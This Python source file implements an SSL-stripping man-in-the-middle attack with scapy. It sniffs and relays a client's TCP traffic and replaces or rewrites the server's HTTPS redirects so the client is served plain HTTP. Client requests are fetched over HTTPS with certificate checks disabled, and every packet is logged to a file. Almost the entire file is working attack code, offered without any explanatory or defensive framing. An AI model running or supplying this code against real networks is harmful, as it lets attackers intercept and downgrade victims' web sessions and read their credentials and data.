import scapy.all as sc
import http.client
import ssl

# === Helpers ===

def is_tcp(pkt): return pkt.haslayer(sc.TCP)
def is_raw(pkt): return pkt.haslayer(sc.Raw)
def is_rst(pkt): return is_tcp(pkt) and pkt[sc.TCP].flags & 0x04
def is_fin(pkt): return is_tcp(pkt) and pkt[sc.TCP].flags & 0x01
def is_syn(pkt): return is_tcp(pkt) and pkt[sc.TCP].flags & 0x02 and not pkt[sc.TCP].flags & 0x10
def is_ack(pkt): return is_tcp(pkt) and pkt[sc.TCP].flags & 0x10 and not pkt[sc.TCP].flags & 0x02
def is_syn_ack(pkt): return is_tcp(pkt) and pkt[sc.TCP].flags & 0x12 == 0x12
def is_https_redirect(pkt):
    return is_raw(pkt) and b"HTTP/1.1 30" in pkt[sc.Raw].load and b"Location: https://" in pkt[sc.Raw].load

def log_packet(tag, pkt, filename="packet_log.txt"):
    with open(filename, "a") as f:
        f.write(f"=== {tag} Packet ===\n")
        f.write(pkt.summary() + "\n")
        f.write(str(pkt.show(dump=True)))
        f.write("\n===================\n\n")

# === Rewrite HTTPS redirect Location header to HTTP ===

def rewrite_redirect_location(raw_response):
    header_end = raw_response.find(b"\r\n\r\n")
    headers = raw_response[:header_end].decode('utf-8', errors='ignore')
    body = raw_response[header_end+4:]

    lines = headers.split("\r\n")
    new_lines = []
    for line in lines:
        if line.lower().startswith("location:"):
            line = line.replace("https://", "http://")
        new_lines.append(line)
    new_headers = "\r\n".join(new_lines)

    return (new_headers + "\r\n\r\n").encode('utf-8') + body

# === Forwarding ===

def forwardServer(pkt, src_mac, dst_mac, iface):
    ether = sc.Ether(src=src_mac, dst=dst_mac)
    if pkt.haslayer(sc.Ether):
        pkt = pkt.payload
    new_pkt = ether / pkt
    sc.sendp(sc.Ether(bytes(new_pkt)), iface=iface, verbose=False)
    log_packet("forwardServer", new_pkt)

def forwardClient(pkt, src_mac, dst_mac, iface):
    ether = sc.Ether(src=src_mac, dst=dst_mac)
    if pkt.haslayer(sc.Ether):
        pkt = pkt.payload
    new_pkt = ether / pkt
    sc.sendp(sc.Ether(bytes(new_pkt)), iface=iface, verbose=False)
    log_packet("forwardClient", new_pkt)

# === HTTPS Redirect Stripping ===

def strip_https_redirect(pkt, attackerMac, clientMac, attackerIP, clientIP, iface):
    print("Intercepting and replacing HTTPS redirect with 200 OK")

    html = "<html><body><h1>Welcome</h1></body></html>"
    body = html.encode("utf-8")
    headers = (
        "HTTP/1.1 200 OK\r\n"
        "Content-Type: text/html\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Connection: close\r\n"
        "Cache-Control: no-store\r\n"
        "\r\n"
    ).encode("utf-8")

    full_response = headers + body

    ether = sc.Ether(src=attackerMac, dst=clientMac)
    ip = sc.IP(src=attackerIP, dst=clientIP)
    tcp = sc.TCP(
        sport=pkt[sc.TCP].sport,
        dport=pkt[sc.TCP].dport,
        seq=pkt[sc.TCP].seq,
        ack=pkt[sc.TCP].ack,
        flags='PA'
    )
    new_pkt = ether / ip / tcp / sc.Raw(load=full_response)
    del new_pkt[sc.IP].chksum
    del new_pkt[sc.TCP].chksum
    sc.sendp(new_pkt, iface=iface, verbose=False)

# === Forward HTTP -> HTTPS and convert response to HTTP ===

def forward_http_to_https(pkt, attackerMac, clientMac, attackerIP, clientIP, serverIP, iface):
    try:
        raw_data = pkt[sc.Raw].load
        request_line = raw_data.split(b"\r\n")[0]
        method, path, *_ = request_line.decode(errors="ignore").split()

        headers = {}
        header_section, _, body = raw_data.partition(b"\r\n\r\n")
        for line in header_section.split(b"\r\n")[1:]:
            if b": " in line:
                key, value = line.decode(errors="ignore").split(": ", 1)
                headers[key] = value

        host_header = headers.get("Host", serverIP)

        if ":" in host_header:
            host, port_str = host_header.split(":", 1)
            port = int(port_str)
        else:
            host = host_header
            port = 4443 

        headers["Host"] = host

        print(f"[*] Fetching HTTPS content from {host}:{port} {path}")
        context = ssl._create_unverified_context()
        conn = http.client.HTTPSConnection(host, port=port, timeout=5, context=context)
        conn.request(method, path, body=body if body else None, headers=headers)
        response = conn.getresponse()
        response_body = response.read()

        # Build raw HTTP response
        status_line = f"HTTP/1.1 {response.status} {response.reason}\r\n"
        headers_raw = ""
        for k, v in response.getheaders():
            headers_raw += f"{k}: {v}\r\n"
        raw_response = (status_line + headers_raw + "\r\n").encode('utf-8') + response_body

        # Rewrite Location header if this is a redirect
        if response.status in [301, 302, 303, 307, 308]:
            raw_response = rewrite_redirect_location(raw_response)

        ether = sc.Ether(src=attackerMac, dst=clientMac)
        ip = sc.IP(src=attackerIP, dst=clientIP)
        tcp = sc.TCP(
            sport=pkt[sc.TCP].sport,
            dport=pkt[sc.TCP].dport,
            seq=pkt[sc.TCP].ack,
            ack=pkt[sc.TCP].seq + len(raw_data),
            flags='PA'
        )
        forged_pkt = ether / ip / tcp / sc.Raw(load=raw_response)
        del forged_pkt[sc.IP].chksum
        del forged_pkt[sc.TCP].chksum
        sc.sendp(forged_pkt, iface=iface, verbose=False)

    except Exception as e:
        print(f"[!] TLS Termination Error: {e}")

# === Main Forwarding Logic ===

def forwarding(mode, iface, clientIP, attackerIP, clientMac, serverIP, attackerMac, serverMac):
    with open("packet_log.txt", "w") as f:
        f.write("=== Packet Log Start ===\n\n")

    handshake = {"client_syn": False, "server_synack": False, "done": False}

    def handle(pkt):
        if not pkt.haslayer(sc.IP) or not pkt.haslayer(sc.TCP):
            return

        src = pkt[sc.IP].src
        dst = pkt[sc.IP].dst
        flags = pkt[sc.TCP].flags

        print(f"[pkt] {pkt.summary()} | Flags: {flags}")

        if not handshake["done"]:
            if src == clientIP and is_syn(pkt):
                print("SYN from client")
                forwardServer(pkt, attackerMac, serverMac, iface)
                handshake["client_syn"] = True
            elif src == serverIP and is_syn_ack(pkt):
                print("SYN-ACK from server")
                forwardClient(pkt, attackerMac, clientMac, iface)
                handshake["server_synack"] = True
            elif src == clientIP and is_ack(pkt) and handshake["client_syn"] and handshake["server_synack"]:
                print("ACK from client — handshake complete")
                forwardServer(pkt, attackerMac, serverMac, iface)
                handshake["done"] = True
            return

        if src == clientIP:
            if mode and is_raw(pkt):
                forward_http_to_https(pkt, attackerMac, clientMac, attackerIP, clientIP, serverIP, iface)
            else:
                forwardServer(pkt, attackerMac, serverMac, iface)
        elif src == serverIP:
            if mode and is_https_redirect(pkt):
                strip_https_redirect(pkt, attackerMac, clientMac, attackerIP, clientIP, iface)
            else:
                forwardClient(pkt, attackerMac, clientMac, iface)

        if is_rst(pkt) or is_fin(pkt):
            print("Connection closed.")
            sniffer.stop()

    sniffer = sc.AsyncSniffer(iface=iface, prn=handle, store=False, promisc=True)
    print("Sniffer started...")
    sniffer.start()
    sniffer.join()
